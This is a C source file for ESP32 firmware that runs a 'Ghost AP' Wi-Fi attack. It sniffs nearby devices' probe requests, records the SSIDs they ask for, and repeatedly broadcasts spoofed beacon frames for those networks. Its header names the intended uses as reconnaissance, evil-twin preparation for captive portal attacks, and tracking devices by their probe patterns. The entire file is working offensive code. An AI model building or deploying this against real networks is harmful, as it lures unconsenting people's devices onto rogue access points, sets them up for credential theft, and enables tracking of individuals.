/**
 * @file attack_probe.c
 * @brief Sniff Probe Requests and create beacons of their SSID (Ghost AP)
 *
 * Discovers SSIDs that nearby devices are probing for, then creates
 * "ghost" beacon frames for each one. This is useful for:
 *   - Reconnaissance: discover what networks devices trust
 *   - Evil Twin prep: find target SSIDs for captive portal attacks
 *   - Device tracking: identify devices by their probe patterns
 */

#include "attack_probe.h"
#include <string.h>
#include <stdio.h>
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "wsl_bypasser.h"
#include "attack.h"
#include "wifi_controller.h"
#include "wifi_radio_claim.h"

#define oled_log(line, row, fmt, ...) ESP_LOGI(TAG, fmt, ##__VA_ARGS__)
#ifndef OLED_HEAD
#define OLED_HEAD 0
#endif
#ifndef OLED_LINE1
#define OLED_LINE1 1
#endif

static const char* TAG = "probe";

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

#define MAX_GHOSTS          20
#define HOP_INTERVAL_MS     200
#define BEACON_INTERVAL_US  100000   /* 100ms */
#define TASK_STACK_SIZE     3072
#define TASK_PRIORITY       3

/* ------------------------------------------------------------------ */
/*  Ghost AP entry                                                     */
/* ------------------------------------------------------------------ */

typedef struct {
    uint8_t ssid[33];       /* null-terminated for convenience */
    uint8_t len;
    uint8_t bssid[6];
    int8_t  rssi;           /* signal strength of the probe */
    int     probe_count;    /* how many probes for this SSID */
    uint8_t channel;        /* channel where first seen */
} ghost_ap_t;

/* ------------------------------------------------------------------ */
/*  Module state                                                       */
/* ------------------------------------------------------------------ */

static ghost_ap_t         discovered_ghosts[MAX_GHOSTS];
static uint8_t            ghost_count       = 0;
static bool               probe_running     = false;
static SemaphoreHandle_t  probe_mutex       = NULL;
static TaskHandle_t       hop_task_handle   = NULL;
static esp_timer_handle_t ghost_timer_handle = NULL;
static uint8_t            own_ap_mac[6];
static int                total_probes_seen = 0;

/* ------------------------------------------------------------------ */
/*  Lazy mutex init                                                    */
/* ------------------------------------------------------------------ */

static void ensure_mutex(void) {
    if (probe_mutex == NULL) {
        probe_mutex = xSemaphoreCreateMutex();
    }
}

/* ------------------------------------------------------------------ */
/*  SSID extraction from 802.11 Probe Request                          */
/* ------------------------------------------------------------------ */

static bool extract_ssid_from_probe(wifi_promiscuous_pkt_t *pkt,
                                     uint8_t *ssid, uint8_t *len) {
    uint16_t frame_len = pkt->rx_ctrl.sig_len;
    if (frame_len <= 28) return false;

    uint8_t *payload = pkt->payload;

    /* Must be a Probe Request (subtype 0x04, type 0x00 => frame ctrl 0x40) */
    if (payload[0] != 0x40) return false;

    uint8_t *ptr = payload + 24;             /* skip MAC header */
    uint8_t *end = payload + frame_len - 4;  /* skip FCS */

    while (ptr + 2 <= end) {
        uint8_t tag     = ptr[0];
        uint8_t tag_len = ptr[1];

        if (tag_len > 32 || ptr + 2 + tag_len > end) break;

        if (tag == 0x00) {   /* SSID tag */
            if (tag_len == 0) return false;  /* broadcast probe */

            /* Verify printable ASCII */
            for (int i = 0; i < tag_len; i++) {
                if (ptr[2 + i] < 0x20 || ptr[2 + i] > 0x7E) return false;
            }
            memcpy(ssid, ptr + 2, tag_len);
            *len = tag_len;
            return true;
        }
        ptr += (2 + tag_len);
    }
    return false;
}

/* ------------------------------------------------------------------ */
/*  Helpers                                                            */
/* ------------------------------------------------------------------ */

static void generate_random_bssid(uint8_t *bssid) {
    for (int i = 0; i < 6; i++) {
        bssid[i] = esp_random() & 0xFF;
    }
    bssid[0] |= 0x02;    /* locally administered */
    bssid[0] &= 0xFE;    /* unicast */
}

static bool is_duplicate(uint8_t *ssid, uint8_t len) {
    for (int i = 0; i < ghost_count; i++) {
        if (discovered_ghosts[i].len == len &&
            memcmp(discovered_ghosts[i].ssid, ssid, len) == 0) {
            return true;
        }
    }
    return false;
}

/* Find existing ghost index by SSID, returns -1 if not found */
static int find_ghost(uint8_t *ssid, uint8_t len) {
    for (int i = 0; i < ghost_count; i++) {
        if (discovered_ghosts[i].len == len &&
            memcmp(discovered_ghosts[i].ssid, ssid, len) == 0) {
            return i;
        }
    }
    return -1;
}

/* ------------------------------------------------------------------ */
/*  Channel hopping task                                               */
/* ------------------------------------------------------------------ */

static void channel_hop_task(void *pvParameters) {
    uint8_t hop_channels[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
    int idx = 0;

    ESP_LOGI(TAG, "Channel hop task started");
    while (probe_running) {
        esp_wifi_set_channel(hop_channels[idx], WIFI_SECOND_CHAN_NONE);
        idx = (idx + 1) % sizeof(hop_channels);
        vTaskDelay(pdMS_TO_TICKS(HOP_INTERVAL_MS));
    }

    ESP_LOGI(TAG, "Channel hop task exiting");
    hop_task_handle = NULL;
    vTaskDelete(NULL);
}

/* ------------------------------------------------------------------ */
/*  Ghost beacon timer                                                 */
/* ------------------------------------------------------------------ */

static void timer_send_ghost_beacons(void *arg) {
    if (ghost_count == 0) return;

    uint8_t current_channel = 1;
    wifi_second_chan_t second_chan;
    esp_wifi_get_channel(&current_channel, &second_chan);

    /* Take mutex to safely read ghost list */
    if (probe_mutex && xSemaphoreTake(probe_mutex, pdMS_TO_TICKS(10)) == pdTRUE) {
        for (int i = 0; i < ghost_count; i++) {
            wsl_bypasser_send_beacon_frame(
                discovered_ghosts[i].bssid,
                discovered_ghosts[i].ssid,
                discovered_ghosts[i].len,
                current_channel
            );
        }
        xSemaphoreGive(probe_mutex);
    }
}

/* ------------------------------------------------------------------ */
/*  Handle a single probe request                                      */
/* ------------------------------------------------------------------ */

static void handle_probe(wifi_promiscuous_pkt_t *pkt) {
    uint8_t ssid[32];
    uint8_t ssid_len = 0;

    if (!extract_ssid_from_probe(pkt, ssid, &ssid_len)) return;
    if (ssid_len == 0 || ssid_len > 32) return;

    total_probes_seen++;

    /* Check mutex — sniffer callback context, use short timeout */
    if (probe_mutex && xSemaphoreTake(probe_mutex, pdMS_TO_TICKS(5)) != pdTRUE) {
        return;   /* skip this probe if mutex is busy */
    }

    /* Check if already seen — increment probe count */
    int existing = find_ghost(ssid, ssid_len);
    if (existing >= 0) {
        discovered_ghosts[existing].probe_count++;
        if (pkt->rx_ctrl.rssi > discovered_ghosts[existing].rssi) {
            discovered_ghosts[existing].rssi = pkt->rx_ctrl.rssi;
        }
        xSemaphoreGive(probe_mutex);
        return;
    }

    /* New ghost AP */
    if (ghost_count >= MAX_GHOSTS) {
        xSemaphoreGive(probe_mutex);
        return;
    }

    memcpy(discovered_ghosts[ghost_count].ssid, ssid, ssid_len);
    discovered_ghosts[ghost_count].ssid[ssid_len] = '\0';  /* null terminate */
    discovered_ghosts[ghost_count].len       = ssid_len;
    discovered_ghosts[ghost_count].rssi      = pkt->rx_ctrl.rssi;
    discovered_ghosts[ghost_count].probe_count = 1;
    discovered_ghosts[ghost_count].channel   = pkt->rx_ctrl.channel;

    generate_random_bssid(discovered_ghosts[ghost_count].bssid);

    ESP_LOGI(TAG, "Ghost AP #%d: \"%.*s\" ch:%d rssi:%d",
             ghost_count + 1, ssid_len, ssid,
             pkt->rx_ctrl.channel, pkt->rx_ctrl.rssi);

    ghost_count++;

    xSemaphoreGive(probe_mutex);
}

/* ------------------------------------------------------------------ */
/*  WiFi sniffer callback (runs in WiFi task context)                  */
/* ------------------------------------------------------------------ */

static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!probe_running) return;
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;

    /* Only Probe Requests */
    if (pkt->payload[0] != 0x40) return;

    /* Filter out our own probes */
    if (memcmp(pkt->payload + 10, own_ap_mac, 6) == 0) return;

    handle_probe(pkt);
}

/* ================================================================== */
/*  Public API                                                         */
/* ================================================================== */

void attack_probe_init(void) {
    ensure_mutex();
    ghost_count = 0;
    total_probes_seen = 0;
    memset(discovered_ghosts, 0, sizeof(discovered_ghosts));
    ESP_LOGI(TAG, "Probe sniffer initialized");
}

void attack_probe_start(attack_config_t *attack_config) {
    if (probe_running) {
        ESP_LOGW(TAG, "Probe sniffer already running");
        return;
    }

    ensure_mutex();

    if (wifi_radio_claim(WIFI_RADIO_OWNER_PROBE) != ESP_OK) {
        ESP_LOGW(TAG, "Cannot start probe: radio busy");
        return;
    }

    ESP_LOGI(TAG, "Starting Ghost Probe sniffer...");

    ghost_count = 0;
    total_probes_seen = 0;
    memset(discovered_ghosts, 0, sizeof(discovered_ghosts));

    wifictl_get_ap_mac(own_ap_mac);
    vTaskDelay(pdMS_TO_TICKS(100));

    /* Set callback BEFORE enabling promiscuous mode */
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_cb);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    probe_running = true;

    /* Start channel hopping task */
    if (hop_task_handle == NULL) {
        xTaskCreatePinnedToCore(channel_hop_task, "probe_hop",
                                TASK_STACK_SIZE, NULL, TASK_PRIORITY,
                                &hop_task_handle, 1);
    }

    /* Start ghost beacon timer */
    if (ghost_timer_handle == NULL) {
        const esp_timer_create_args_t timer_args = {
            .callback = &timer_send_ghost_beacons,
            .name = "ghost_beacon_timer"
        };
        esp_timer_create(&timer_args, &ghost_timer_handle);
    }
    esp_timer_start_periodic(ghost_timer_handle, BEACON_INTERVAL_US);

    ESP_LOGI(TAG, "Probe sniffer active — hopping channels, capturing probes");
}

void attack_probe_stop(void) {
    if (!probe_running) return;

    ESP_LOGI(TAG, "Stopping probe sniffer...");
    probe_running = false;

    /* Stop beacon timer */
    if (ghost_timer_handle != NULL) {
        if (esp_timer_is_active(ghost_timer_handle)) {
            esp_timer_stop(ghost_timer_handle);
        }
        esp_timer_delete(ghost_timer_handle);
        ghost_timer_handle = NULL;
    }

    /* Stop promiscuous mode */
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);

    /* Channel hop task exits on its own (checks probe_running) */
    /* Give it time to exit gracefully */
    vTaskDelay(pdMS_TO_TICKS(500));
    if (hop_task_handle != NULL) {
        vTaskDelete(hop_task_handle);
        hop_task_handle = NULL;
    }

    wifi_radio_release(WIFI_RADIO_OWNER_PROBE);

    ESP_LOGI(TAG, "Stopped. Discovered %d ghost APs from %d probes",
             ghost_count, total_probes_seen);
}

bool attack_probe_is_running(void) {
    return probe_running;
}

int attack_probe_get_ghost_count(void) {
    if (probe_mutex == NULL) return ghost_count;
    xSemaphoreTake(probe_mutex, portMAX_DELAY);
    int count = ghost_count;
    xSemaphoreGive(probe_mutex);
    return count;
}

void attack_probe_get_ghosts(probe_ghost_entry_t *out_entries,
                              int max_entries, int *out_count) {
    if (out_entries == NULL || out_count == NULL) return;
    if (probe_mutex == NULL) {
        *out_count = 0;
        return;
    }

    xSemaphoreTake(probe_mutex, portMAX_DELAY);
    int count = ghost_count;
    if (count > max_entries) count = max_entries;

    for (int i = 0; i < count; i++) {
        memcpy(out_entries[i].ssid, discovered_ghosts[i].ssid,
               discovered_ghosts[i].len + 1);
        out_entries[i].len        = discovered_ghosts[i].len;
        out_entries[i].rssi       = discovered_ghosts[i].rssi;
        out_entries[i].probe_count = discovered_ghosts[i].probe_count;
        out_entries[i].channel    = discovered_ghosts[i].channel;
        memcpy(out_entries[i].bssid, discovered_ghosts[i].bssid, 6);
    }
    *out_count = count;
    xSemaphoreGive(probe_mutex);
}

void attack_probe_clear_ghosts(void) {
    if (probe_mutex == NULL) return;
    xSemaphoreTake(probe_mutex, portMAX_DELAY);
    ghost_count = 0;
    total_probes_seen = 0;
    memset(discovered_ghosts, 0, sizeof(discovered_ghosts));
    xSemaphoreGive(probe_mutex);
}

const char *attack_probe_get_status_json(void) {
    static char json_buf[1024];
    if (probe_mutex == NULL) {
        snprintf(json_buf, sizeof(json_buf),
                 "{\"running\":false,\"ghost_count\":0,\"total_probes\":0}");
        return json_buf;
    }

    xSemaphoreTake(probe_mutex, portMAX_DELAY);
    snprintf(json_buf, sizeof(json_buf),
        "{\"running\":%s,\"ghost_count\":%d,\"total_probes\":%d}",
        probe_running ? "true" : "false",
        ghost_count,
        total_probes_seen);
    xSemaphoreGive(probe_mutex);
    return json_buf;
}

/* Legacy API compatibility */
void attack_method_probe(attack_config_t *config) {
    attack_probe_start(config);
}
